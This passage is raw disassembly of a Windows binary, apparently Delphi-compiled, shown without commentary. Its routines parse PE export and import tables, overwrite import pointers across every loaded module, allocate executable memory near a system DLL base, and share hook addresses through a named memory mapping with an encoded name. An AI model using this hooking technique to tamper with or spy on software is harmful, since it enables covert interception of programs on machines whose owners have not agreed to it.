		jnz	short loc_40C9F8
		lea	ecx, [ebp+var_C]
		lea	edx, [ebp+var_8]
		mov	eax, [ebp+arg_0]
		mov	eax, [eax-4]
		call	sub_409A00
		test	al, al
		jz	short loc_40C9F8
		mov	ecx, [ebp+var_C]
		mov	eax, [ecx+14h]
		dec	eax
		test	eax, eax
		jl	short loc_40C9F8
		inc	eax
		xor	edx, edx

loc_40C9DA:				; CODE XREF: sub_40C984+72j
		mov	ebx, [ecx+1Ch]
		add	ebx, [ebp+var_8]
		mov	esi, [ebx+edx*4]
		add	esi, [ebp+var_8]
		mov	ebx, [ebp+arg_0]
		cmp	esi, [ebx-4]
		jnz	short loc_40C9F4
		mov	[ebp+var_1], 1
		jmp	short loc_40C9F8
; ---------------------------------------------------------------------------

loc_40C9F4:				; CODE XREF: sub_40C984+68j
		inc	edx
		dec	eax
		jnz	short loc_40C9DA

loc_40C9F8:				; CODE XREF: sub_40C984+31j
					; sub_40C984+46j ...
		mov	al, [ebp+var_1]
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40C984	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40CA04	proc near		; CODE XREF: sub_40CCFC+18p
					; sub_40CD78+1B4p ...

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	[ebp+var_4], eax
		mov	ebx, [ebp+var_4]
		cmp	[ebp+var_4], 0
		jz	short loc_40CA6B
		push	ebp
		call	sub_40C984
		pop	ecx
		test	al, al
		jz	short loc_40CA25
		mov	ebx, [ebp+var_4]
		jmp	short loc_40CA6B
; ---------------------------------------------------------------------------

loc_40CA25:				; CODE XREF: sub_40CA04+1Aj
		mov	eax, [ebp+var_4]
		cmp	word ptr [eax],	25FFh
		jnz	short loc_40CA6B
		mov	eax, [ebp+var_4]
		add	eax, 2
		mov	eax, [eax]
		mov	eax, [eax]
		mov	[ebp+var_4], eax
		push	ebp
		call	sub_40C984
		pop	ecx
		test	al, al
		jz	short loc_40CA4C
		mov	ebx, [ebp+var_4]
		jmp	short loc_40CA6B
; ---------------------------------------------------------------------------

loc_40CA4C:				; CODE XREF: sub_40CA04+41j
		mov	eax, [ebp+var_4]
		cmp	byte ptr [eax],	68h
		jnz	short loc_40CA6B
		mov	eax, [ebp+var_4]
		inc	eax
		mov	eax, [eax]
		mov	[ebp+var_4], eax
		push	ebp
		call	sub_40C984
		pop	ecx
		test	al, al
		jz	short loc_40CA6B
		mov	ebx, [ebp+var_4]

loc_40CA6B:				; CODE XREF: sub_40CA04+Fj
					; sub_40CA04+1Fj ...
		mov	eax, ebx
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40CA04	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40CA74	proc near		; CODE XREF: sub_40F0A4+CEp
					; sub_40F0A4+4C0p ...

Buffer		= dword	ptr -28h
var_1C		= dword	ptr -1Ch
var_18		= dword	ptr -18h

		push	ebx
		push	esi
		push	edi
		add	esp, 0FFFFFFE4h
		mov	edi, eax
		xor	esi, esi
		call	GetVersion_0
		test	eax, 80000000h
		jnz	short loc_40CAE5
		mov	ebx, 5F040000h
		jmp	short loc_40CAD3
; ---------------------------------------------------------------------------

loc_40CA91:				; CODE XREF: sub_40CA74+6Fj
		cmp	[esp+28h+var_18], 10000h
		jnz	short loc_40CAB1
		push	40h		; flProtect
		push	2000h		; flAllocationType
		push	edi		; dwSize
		mov	eax, [esp+34h+Buffer]
		push	eax		; lpAddress
		call	VirtualAlloc_0
		mov	esi, eax
		jmp	short loc_40CAE5
; ---------------------------------------------------------------------------

loc_40CAB1:				; CODE XREF: sub_40CA74+25j
		cmp	[esp+28h+var_1C], 10000h
		jnb	short loc_40CAC5
		mov	[esp+28h+var_1C], 10000h
		jmp	short loc_40CACD
; ---------------------------------------------------------------------------

loc_40CAC5:				; CODE XREF: sub_40CA74+45j
		and	[esp+28h+var_1C], 0FFFF0000h

loc_40CACD:				; CODE XREF: sub_40CA74+4Fj
		mov	eax, [esp+28h+var_1C]
		add	ebx, eax

loc_40CAD3:				; CODE XREF: sub_40CA74+1Bj
		push	1Ch		; dwLength
		lea	eax, [esp+2Ch+Buffer]
		push	eax		; lpBuffer
		push	ebx		; lpAddress
		call	VirtualQuery
		cmp	eax, 1Ch
		jz	short loc_40CA91

loc_40CAE5:				; CODE XREF: sub_40CA74+14j
					; sub_40CA74+3Bj
		push	40h		; flProtect
		push	1000h		; flAllocationType
		push	edi		; dwSize
		push	esi		; lpAddress
		call	VirtualAlloc_0
		mov	esi, eax
		mov	eax, esi
		add	esp, 1Ch
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40CA74	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40CB00	proc near		; CODE XREF: sub_40F0A4+5A4p
					; sub_41004C+1FDp

var_18		= dword	ptr -18h
var_11		= byte ptr -11h
var_10		= dword	ptr -10h
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFE8h
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_8], ecx
		mov	[ebp+var_4], edx
		mov	ebx, eax
		mov	[ebp+var_9], 0
		mov	eax, ebx
		call	sub_4067D4
		test	eax, eax
		jz	loc_40CBC1
		xor	edx, edx
		push	ebp
		push	offset loc_40CBB7
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		mov	eax, [eax+78h]
		add	eax, ebx
		test	eax, eax
		jz	short loc_40CBAD
		mov	[ebp+var_18], eax
		mov	eax, [ebp+var_18]
		mov	edi, [eax+14h]
		dec	edi
		test	edi, edi
		jl	short loc_40CBAD
		inc	edi
		xor	esi, esi

loc_40CB4C:				; CODE XREF: sub_40CB00+ABj
		mov	eax, [ebp+var_18]
		mov	eax, [eax+1Ch]
		add	eax, ebx
		mov	eax, [eax+esi*4]
		add	eax, ebx
		cmp	eax, [ebp+var_4]
		jnz	short loc_40CBA9
		mov	eax, [ebp+var_18]
		mov	eax, [eax+1Ch]
		add	eax, ebx
		lea	eax, [eax+esi*4]
		mov	[ebp+var_10], eax
		mov	eax, [ebp+var_10]
		call	sub_40A9CC
		mov	[ebp+var_11], al
		mov	edx, 4
		mov	eax, [ebp+var_10]
		call	sub_40AAAC
		test	al, al
		jz	short loc_40CBA9
		mov	eax, [ebp+var_8]
		sub	eax, ebx
		mov	edx, [ebp+var_10]
		mov	[edx], eax
		cmp	[ebp+var_11], 0
		jz	short loc_40CBA5
		mov	edx, 4
		mov	eax, [ebp+var_10]
		call	sub_40AB3C

loc_40CBA5:				; CODE XREF: sub_40CB00+96j
		mov	[ebp+var_9], 1

loc_40CBA9:				; CODE XREF: sub_40CB00+5Cj
					; sub_40CB00+86j
		inc	esi
		dec	edi
		jnz	short loc_40CB4C

loc_40CBAD:				; CODE XREF: sub_40CB00+39j
					; sub_40CB00+47j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		jmp	short loc_40CBC1
; ---------------------------------------------------------------------------

loc_40CBB7:				; DATA XREF: sub_40CB00+27o
		jmp	sub_402FBC
; ---------------------------------------------------------------------------
		call	sub_4033E8

loc_40CBC1:				; CODE XREF: sub_40CB00+1Ej
					; sub_40CB00+B5j
		mov	al, [ebp+var_9]
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40CB00	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40CBCC	proc near		; CODE XREF: sub_40CC4C+70p
					; DATA XREF: sub_40CD78+EDo ...

arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		push	esi
		push	edi
		push	ebx
		mov	eax, [ebp+arg_0]
		cmp	word ptr [eax],	5A4Dh
		jnz	short loc_40CC44
		mov	ecx, [eax+3Ch]
		add	ecx, eax
		cmp	word ptr [ecx],	4550h
		jnz	short loc_40CC44
		mov	edi, [ecx+80h]
		cmp	edi, 0
		jz	short loc_40CC44
		mov	ebx, [ecx+50h]
		cmp	edi, ebx
		jnb	short loc_40CC44
		add	edi, eax
		cmp	edi, 0
		jz	short loc_40CC44

loc_40CC01:				; CODE XREF: sub_40CBCC+76j
		cmp	dword ptr [edi+0Ch], 0
		jz	short loc_40CC44
		mov	esi, [edi+10h]
		cmp	esi, 0
		jz	short loc_40CC44
		cmp	esi, ebx
		jnb	short loc_40CC44
		add	esi, [ebp+arg_0]
		cmp	esi, 0
		jz	short loc_40CC44

loc_40CC1B:				; CODE XREF: sub_40CBCC+71j
		cmp	dword ptr [esi], 0
		jz	short loc_40CC3F
		mov	edx, [ebp+arg_4]
		cmp	[esi], edx
		jnz	short loc_40CC3A
		push	4
		push	esi
		call	ds:off_416A58
		cmp	eax, 0
		jz	short loc_40CC3A
		mov	edx, [ebp+arg_8]
		mov	[esi], edx

loc_40CC3A:				; CODE XREF: sub_40CBCC+59j
					; sub_40CBCC+67j
		add	esi, 4
		jmp	short loc_40CC1B
; ---------------------------------------------------------------------------

loc_40CC3F:				; CODE XREF: sub_40CBCC+52j
		add	edi, 14h
		jmp	short loc_40CC01
; ---------------------------------------------------------------------------

loc_40CC44:				; CODE XREF: sub_40CBCC+Ej
					; sub_40CBCC+1Aj ...
		pop	ebx
		pop	edi
		pop	esi
		pop	ebp
		retn	0Ch
sub_40CBCC	endp

; ---------------------------------------------------------------------------
		retn

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40CC4C	proc near		; CODE XREF: sub_40CCD4+4p
					; DATA XREF: sub_40CD78+104o ...

var_20		= dword	ptr -20h
var_1C		= byte ptr -1Ch
var_18		= dword	ptr -18h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
arg_0		= dword	ptr  8
arg_4		= dword	ptr  0Ch
arg_8		= dword	ptr  10h

		push	ebp
		mov	ebp, esp
		sub	esp, 20h
		pusha
		pushf
		xor	ebx, ebx
		mov	esi, [ebp+arg_0]
		mov	edi, [ebp+arg_4]
		mov	[ebp+var_20], 0

loc_40CC63:				; CODE XREF: sub_40CC4C+79j
		push	1Ch
		lea	eax, [ebp+var_1C]
		push	eax
		push	ebx
		call	ds:dword_416A44
		cmp	eax, 1Ch
		jnz	short loc_40CCC7
		cmp	[ebp+var_C], 1000h
		jnz	short loc_40CCC2
		cmp	[ebp+var_18], 0
		jz	short loc_40CCC2
		mov	eax, [ebp+var_18]
		cmp	[ebp+var_20], eax
		jz	short loc_40CCC2
		mov	[ebp+var_20], eax
		mov	eax, [ebp+arg_8]
		cmp	eax, 0
		jnz	short loc_40CCA1
		mov	eax, [ebp+var_18]
		cmp	eax, 80000000h
		jnb	short loc_40CCC7

loc_40CCA1:				; CODE XREF: sub_40CC4C+49j
		push	2
		lea	eax, [ebp+var_1C]
		push	eax
		mov	eax, [ebp+var_18]
		push	eax
		call	ds:dword_416A14
		cmp	eax, 0
		jz	short loc_40CCC2
		push	edi
		push	esi
		mov	eax, [ebp+var_18]
		push	eax
		call	ds:off_416A5C

loc_40CCC2:				; CODE XREF: sub_40CC4C+30j
					; sub_40CC4C+36j ...
		add	ebx, [ebp+var_10]
		jmp	short loc_40CC63
; ---------------------------------------------------------------------------

loc_40CCC7:				; CODE XREF: sub_40CC4C+27j
					; sub_40CC4C+53j
		popf
		popa
		add	esp, 20h
		pop	ebp
		retn	0Ch
sub_40CC4C	endp

; ---------------------------------------------------------------------------
		retn
; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40CCD4	proc near		; CODE XREF: sub_40F0A4+622p
		push	1
		push	edx
		push	eax
		call	sub_40CC4C
		retn
sub_40CCD4	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40CCE0	proc near		; DATA XREF: sub_40D1F8+1A1o

arg_0		= dword	ptr  8

		push	ebp
		mov	ebp, esp
		push	[ebp+arg_0]
		call	ds:dword_416A48
		push	0
		call	ds:dword_4169F0
		xor	eax, eax
		pop	ebp
		retn	4
sub_40CCE0	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================


sub_40CCFC	proc near		; CODE XREF: sub_40CD78+18Dp
					; sub_40F0A4+5ADp ...
		push	ebx
		call	sub_4097D4
		mov	ebx, eax
		mov	eax, ebx
		call	sub_4067D4
		test	eax, eax
		jz	short loc_40CD1B
		add	ebx, [eax+28h]
		mov	eax, ebx
		call	sub_40CA04
		pop	ebx
		retn
; ---------------------------------------------------------------------------

loc_40CD1B:				; CODE XREF: sub_40CCFC+11j
		xor	eax, eax
		pop	ebx
		retn
sub_40CCFC	endp

; ---------------------------------------------------------------------------
		align 10h

; =============== S U B	R O U T	I N E =======================================


sub_40CD20	proc near		; CODE XREF: sub_40F0A4+5C1p

var_14		= byte ptr -14h

		push	ebx
		push	esi
		push	edi
		push	ebp
		push	ecx
		mov	ebp, eax
		call	sub_4097D4
		mov	edi, eax
		mov	eax, edi
		call	sub_4067D4
		xor	ebx, ebx
		test	eax, eax
		jz	short loc_40CD70
		lea	esi, [eax+28h]
		mov	eax, esi
		call	sub_40A9CC
		mov	[esp+14h+var_14], al
		mov	edx, 4
		mov	eax, esi
		call	sub_40AAAC
		test	al, al
		jz	short loc_40CD70
		sub	ebp, edi
		mov	[esi], ebp
		cmp	[esp+14h+var_14], 0
		jz	short loc_40CD6E
		mov	edx, 4
		mov	eax, esi
		call	sub_40AB3C

loc_40CD6E:				; CODE XREF: sub_40CD20+40j
		mov	bl, 1

loc_40CD70:				; CODE XREF: sub_40CD20+19j
					; sub_40CD20+36j
		mov	eax, ebx
		pop	edx
		pop	ebp
		pop	edi
		pop	esi
		pop	ebx
		retn
sub_40CD20	endp


; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40CD78	proc near		; CODE XREF: sub_40F0A4+5FAp

var_30		= dword	ptr -30h
var_2C		= dword	ptr -2Ch
var_10		= dword	ptr -10h
var_9		= byte ptr -9
var_8		= dword	ptr -8
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFFF0h
		push	ebx
		push	esi
		push	edi
		xor	ecx, ecx
		mov	[ebp+var_10], ecx
		mov	[ebp+var_8], edx
		mov	[ebp+var_4], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40CF8B
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	ds:off_416A60, 80000000h
		jnb	loc_40CEE3
		lea	edx, [ebp+var_10]
		mov	eax, offset dword_40CFA4
		call	sub_4064CC
		mov	eax, [ebp+var_10]
		call	sub_403E24
		push	eax		; lpName
		push	14h		; dwMaximumSizeLow
		push	0		; dwMaximumSizeHigh
		push	4		; flProtect
		push	0		; lpFileMappingAttributes
		push	0FFFFFFFFh	; hFile
		call	CreateFileMappingA
		mov	esi, eax
		test	esi, esi
		jz	loc_40CEE3
		call	GetLastError
		cmp	eax, 0B7h
		setnz	[ebp+var_9]
		push	0		; dwNumberOfBytesToMap
		push	0		; dwFileOffsetLow
		push	0		; dwFileOffsetHigh
		push	0F001Fh		; dwDesiredAccess
		push	esi		; hFileMappingObject
		call	MapViewOfFile
		mov	ebx, eax
		test	ebx, ebx
		jz	loc_40CEDD
		mov	edi, 32h

loc_40CE07:				; CODE XREF: sub_40CD78+B9j
		cmp	[ebp+var_9], 0
		jnz	short loc_40CE33
		mov	eax, [ebx]
		mov	edx, [ebx+4]
		push	edx
		push	eax
		mov	eax, [ebp+var_10]
		mov	edx, [eax+4]
		mov	eax, [eax]
		cmp	edx, [esp+30h+var_2C]
		jnz	short loc_40CE25
		cmp	eax, [esp+30h+var_30]

loc_40CE25:				; CODE XREF: sub_40CD78+A8j
		pop	edx
		pop	eax
		jz	short loc_40CE33
		push	32h		; dwMilliseconds
		call	Sleep
		dec	edi
		jnz	short loc_40CE07

loc_40CE33:				; CODE XREF: sub_40CD78+93j
					; sub_40CD78+AFj
		cmp	[ebp+var_9], 0
		jnz	short loc_40CE4A
		mov	eax, [ebx]
		mov	edx, [ebx+4]
		mov	ecx, [ebp+var_10]
		cmp	edx, [ecx+4]
		jnz	short loc_40CE48
		cmp	eax, [ecx]

loc_40CE48:				; CODE XREF: sub_40CD78+CCj
		jz	short loc_40CEBF

loc_40CE4A:				; CODE XREF: sub_40CD78+BFj
		push	0
		push	0
		mov	eax, offset sub_40AA0C
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	ds:off_416A58, eax
		push	0
		push	0
		mov	eax, offset sub_40CBCC
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	ds:off_416A5C, eax
		push	0
		push	0
		mov	eax, offset sub_40CC4C
		xor	ecx, ecx
		xor	edx, edx
		call	sub_40AB44
		mov	ds:off_416A60, eax
		mov	eax, ds:off_416A58
		mov	[ebx+8], eax
		mov	eax, ds:off_416A5C
		mov	[ebx+0Ch], eax
		mov	eax, ds:off_416A60
		mov	[ebx+10h], eax
		mov	edx, ebx
		mov	ecx, 8
		mov	eax, [ebp+var_10]
		call	sub_40C1B0
		mov	eax, esi
		call	sub_40A660
		jmp	short loc_40CED7
; ---------------------------------------------------------------------------

loc_40CEBF:				; CODE XREF: sub_40CD78:loc_40CE48j
		mov	eax, [ebx+8]
		mov	ds:off_416A58, eax
		mov	eax, [ebx+0Ch]
		mov	ds:off_416A5C, eax
		mov	eax, [ebx+10h]
		mov	ds:off_416A60, eax

loc_40CED7:				; CODE XREF: sub_40CD78+145j
		push	ebx		; lpBaseAddress
		call	UnmapViewOfFile

loc_40CEDD:				; CODE XREF: sub_40CD78+84j
		push	esi		; hObject
		call	CloseHandle

loc_40CEE3:				; CODE XREF: sub_40CD78+2Cj
					; sub_40CD78+5Bj
		cmp	ds:off_416A60, 80000000h
		jb	loc_40CF75
		mov	eax, [ebp+var_8]
		mov	ds:dword_416A71, eax
		mov	eax, [ebp+var_4]
		mov	ds:dword_416A76, eax
		push	0
		call	sub_40CCFC
		push	eax
		push	offset dword_416A64
		push	offset dword_4176C0
		push	4
		xor	ecx, ecx
		xor	edx, edx
		xor	eax, eax
		call	sub_410970
		mov	eax, offset dword_40CFB8
		call	sub_409880
		call	sub_40CA04
		sub	eax, offset byte_416AB3
		mov	ds:dword_416AAF, eax
		mov	eax, [ebp+var_8]
		mov	ds:dword_416AD0, eax
		mov	eax, [ebp+var_4]
		mov	ds:dword_416AD5, eax
		push	0
		mov	eax, offset dword_40CFD4
		call	sub_409880
		call	sub_40CA04
		push	eax
		push	offset aSld	; "SD$\b="
		push	offset dword_4176C4
		push	4
		xor	ecx, ecx
		xor	edx, edx
		xor	eax, eax
		call	sub_410970

loc_40CF75:				; CODE XREF: sub_40CD78+175j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40CF92

loc_40CF82:				; CODE XREF: sub_40CD78+218j
		lea	eax, [ebp+var_10]
		call	sub_403994
		retn
; ---------------------------------------------------------------------------

loc_40CF8B:				; DATA XREF: sub_40CD78+17o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40CF82
; ---------------------------------------------------------------------------

loc_40CF92:				; CODE XREF: sub_40CD78+212j
					; DATA XREF: sub_40CD78+205o
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40CD78	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 8
dword_40CFA4	dd 53D3638h, 2D6C011Ch,	0 ; DATA XREF: sub_40CD78+35o
		dd 0FFFFFFFFh, 10h
dword_40CFB8	dd 18213012h, 3920313Ah, 3B341D30h, 14303931h, 0
					; DATA XREF: sub_40CD78+1AAo
		dd 0FFFFFFFFh, 0Ch
dword_40CFD4	dd 31343A19h, 27373C19h, 142C2734h, 0 ;	DATA XREF: sub_40CD78+1D6o
off_40CFE4	dd offset dword_40CFE8	; DATA XREF: sub_40D00C+C3r
					; sub_40D1F8+C8r ...
dword_40CFE8	dd 392E0311h, 0A33h, 0	; DATA XREF: CODE:off_40CFE4o
		dd 0FFFFFF00h, 0FFh, 616D0B00h,	646F4364h, 6F6F4865h, 408D6Bh

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40D00C	proc near		; CODE XREF: sub_40D148+9p
					; sub_40D194+Cp ...

var_C		= dword	ptr -0Ch
var_8		= dword	ptr -8
var_1		= byte ptr -1

		push	ebp
		mov	ebp, esp
		push	0
		push	0
		push	0
		push	ebx
		push	esi
		push	edi
		mov	[ebp+var_1], dl
		mov	ebx, eax
		xor	eax, eax
		push	ebp
		push	offset loc_40D109
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		lea	edx, [ebp+var_8]
		mov	eax, offset dword_40D124
		call	sub_4064CC
		lea	eax, [ebp+var_8]
		push	eax
		lea	eax, [ebp+var_C]
		push	eax
		call	GetCurrentProcessId
		mov	cl, 30h
		mov	edx, 1
		call	sub_4061D8
		mov	edx, [ebp+var_C]
		pop	eax
		call	sub_403C2C
		mov	eax, [ebp+var_8]
		call	sub_403E24
		push	eax		; lpName
		call	sub_40C210
		mov	[ebx], eax
		cmp	dword ptr [ebx], 0
		jz	short loc_40D079
		push	0FFFFFFFFh	; dwMilliseconds
		mov	eax, [ebx]
		push	eax		; hHandle
		call	WaitForSingleObject

loc_40D079:				; CODE XREF: sub_40D00C+61j
		or	edi, 0FFFFFFFFh
		mov	eax, ds:dword_4176C8
		call	sub_404564
		mov	esi, eax
		test	esi, esi
		jl	short loc_40D0AA
		inc	esi
		xor	ebx, ebx

loc_40D08F:				; CODE XREF: sub_40D00C+9Cj
		call	GetCurrentThreadId_0
		lea	edx, [ebx+ebx*4]
		mov	ecx, ds:dword_4176C8
		cmp	eax, [ecx+edx*2]
		jnz	short loc_40D0A6
		mov	edi, ebx
		jmp	short loc_40D0AA
; ---------------------------------------------------------------------------

loc_40D0A6:				; CODE XREF: sub_40D00C+94j
		inc	ebx
		dec	esi
		jnz	short loc_40D08F

loc_40D0AA:				; CODE XREF: sub_40D00C+7Ej
					; sub_40D00C+98j
		cmp	edi, 0FFFFFFFFh
		setz	al
		and	al, [ebp+var_1]
		jz	short loc_40D0EE
		mov	eax, ds:dword_4176C8
		call	sub_40455C
		mov	edi, eax
		lea	eax, [edi+1]
		push	eax
		mov	eax, offset dword_4176C8
		mov	ecx, 1
		mov	edx, off_40CFE4
		call	sub_404718
		add	esp, 4
		call	GetCurrentThreadId_0
		lea	edx, [edi+edi*4]
		mov	ecx, ds:dword_4176C8
		mov	[ecx+edx*2], eax

loc_40D0EE:				; CODE XREF: sub_40D00C+A7j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D110

loc_40D0FB:				; CODE XREF: sub_40D00C+102j
		lea	eax, [ebp+var_C]
		mov	edx, 2
		call	sub_4039B8
		retn
; ---------------------------------------------------------------------------

loc_40D109:				; DATA XREF: sub_40D00C+14o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D0FB
; ---------------------------------------------------------------------------

loc_40D110:				; CODE XREF: sub_40D00C+FCj
					; DATA XREF: sub_40D00C+EAo
		mov	eax, edi
		pop	edi
		pop	esi
		pop	ebx
		mov	esp, ebp
		pop	ebp
		retn
sub_40D00C	endp

; ---------------------------------------------------------------------------
		align 4
		dd 0FFFFFFFFh, 0Bh
dword_40D124	dd 183D3638h, 34162D3Ch, 303D36h ; DATA	XREF: sub_40D00C+22o

; =============== S U B	R O U T	I N E =======================================


sub_40D130	proc near		; CODE XREF: sub_40D148+39p
					; sub_40D194+50p ...
		push	ebx
		mov	ebx, eax
		test	ebx, ebx
		jz	short loc_40D143
		push	ebx		; hMutex
		call	ReleaseMutex
		push	ebx		; hObject
		call	CloseHandle

loc_40D143:				; CODE XREF: sub_40D130+5j
		pop	ebx
		retn
sub_40D130	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40D148	proc near		; CODE XREF: sub_40F0A4+62p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		lea	eax, [ebp+var_4]
		mov	dl, 1
		call	sub_40D00C
		xor	edx, edx
		push	ebp
		push	offset loc_40D187
		push	dword ptr fs:[edx]
		mov	fs:[edx], esp
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176C8
		inc	dword ptr [edx+eax*2+4]
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D18E

loc_40D17E:				; CODE XREF: sub_40D148+44j
		mov	eax, [ebp+var_4]
		call	sub_40D130
		retn
; ---------------------------------------------------------------------------

loc_40D187:				; DATA XREF: sub_40D148+11o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D17E
; ---------------------------------------------------------------------------

loc_40D18E:				; CODE XREF: sub_40D148+3Ej
					; DATA XREF: sub_40D148+31o
		pop	ecx
		pop	ebp
		retn
sub_40D148	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40D194	proc near		; CODE XREF: sub_40F0A4+606p

var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		push	ecx
		push	ebx
		mov	ebx, eax
		lea	eax, [ebp+var_4]
		mov	dl, 1
		call	sub_40D00C
		xor	ecx, ecx
		push	ebp
		push	offset loc_40D1EA
		push	dword ptr fs:[ecx]
		mov	fs:[ecx], esp
		lea	edx, [eax+eax*4]
		mov	ecx, ds:dword_4176C8
		mov	byte ptr [ecx+edx*2+8],	1
		mov	ecx, ds:dword_4176C8
		or	bl, [ecx+edx*2+9]
		mov	eax, ds:dword_4176C8
		mov	[eax+edx*2+9], bl
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D1F1

loc_40D1E1:				; CODE XREF: sub_40D194+5Bj
		mov	eax, [ebp+var_4]
		call	sub_40D130
		retn
; ---------------------------------------------------------------------------

loc_40D1EA:				; DATA XREF: sub_40D194+14o
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D1E1
; ---------------------------------------------------------------------------

loc_40D1F1:				; CODE XREF: sub_40D194+55j
					; DATA XREF: sub_40D194+48o
		pop	ebx
		pop	ecx
		pop	ebp
		retn
sub_40D194	endp

; ---------------------------------------------------------------------------
		align 4

; =============== S U B	R O U T	I N E =======================================

; Attributes: bp-based frame

sub_40D1F8	proc near		; CODE XREF: sub_40F0A4:loc_40FF3Ap

var_170		= dword	ptr -170h
var_16C		= dword	ptr -16Ch
var_150		= dword	ptr -150h
dwProcessId	= dword	ptr -148h
var_28		= dword	ptr -28h
var_24		= dword	ptr -24h
nCount		= dword	ptr -20h
lpHandles	= dword	ptr -1Ch
var_18		= dword	ptr -18h
hObject		= dword	ptr -14h
var_10		= dword	ptr -10h
var_C		= dword	ptr -0Ch
var_6		= byte ptr -6
var_5		= byte ptr -5
var_4		= dword	ptr -4

		push	ebp
		mov	ebp, esp
		add	esp, 0FFFFFEB0h
		push	ebx
		push	esi
		push	edi
		xor	eax, eax
		mov	[ebp+lpHandles], eax
		mov	[ebp+var_28], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40D5F8
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		mov	[ebp+var_5], 0
		mov	[ebp+var_6], 0
		lea	eax, [ebp+var_4]
		xor	edx, edx
		call	sub_40D00C
		mov	[ebp+nCount], eax
		xor	eax, eax
		push	ebp
		push	offset loc_40D2E4
		push	dword ptr fs:[eax]
		mov	fs:[eax], esp
		cmp	[ebp+nCount], 0FFFFFFFFh
		jz	loc_40D2CE
		mov	ebx, [ebp+nCount]
		lea	ebx, [ebx+ebx*4]
		mov	eax, ds:dword_4176C8
		dec	dword ptr [eax+ebx*2+4]
		mov	eax, ds:dword_4176C8
		cmp	dword ptr [eax+ebx*2+4], 0
		jnz	short loc_40D2CE
		mov	eax, ds:dword_4176C8
		mov	al, [eax+ebx*2+8]
		mov	[ebp+var_5], al
		mov	eax, ds:dword_4176C8
		mov	al, [eax+ebx*2+9]
		mov	[ebp+var_6], al
		mov	eax, ds:dword_4176C8
		call	sub_404564
		lea	eax, [eax+eax*4]
		mov	edx, ds:dword_4176C8
		mov	ecx, ds:dword_4176C8
		mov	esi, [edx+eax*2]
		mov	[ecx+ebx*2], esi
		mov	esi, [edx+eax*2+4]
		mov	[ecx+ebx*2+4], esi
		mov	si, [edx+eax*2+8]
		mov	[ecx+ebx*2+8], si
		mov	eax, ds:dword_4176C8
		call	sub_404564
		push	eax
		mov	eax, offset dword_4176C8
		mov	ecx, 1
		mov	edx, off_40CFE4
		call	sub_404718
		add	esp, 4

loc_40D2CE:				; CODE XREF: sub_40D1F8+49j
					; sub_40D1F8+68j
		xor	eax, eax
		pop	edx
		pop	ecx
		pop	ecx
		mov	fs:[eax], edx
		push	offset loc_40D2EB

loc_40D2DB:				; CODE XREF: sub_40D1F8+F1j
		mov	eax, [ebp+var_4]
		call	sub_40D130
		retn
; ---------------------------------------------------------------------------

loc_40D2E4:				; DATA XREF: sub_40D1F8+3Ao
		jmp	loc_403270
; ---------------------------------------------------------------------------
		jmp	short loc_40D2DB
; ---------------------------------------------------------------------------

loc_40D2EB:				; CODE XREF: sub_40D1F8+EBj
					; DATA XREF: sub_40D1F8+DEo
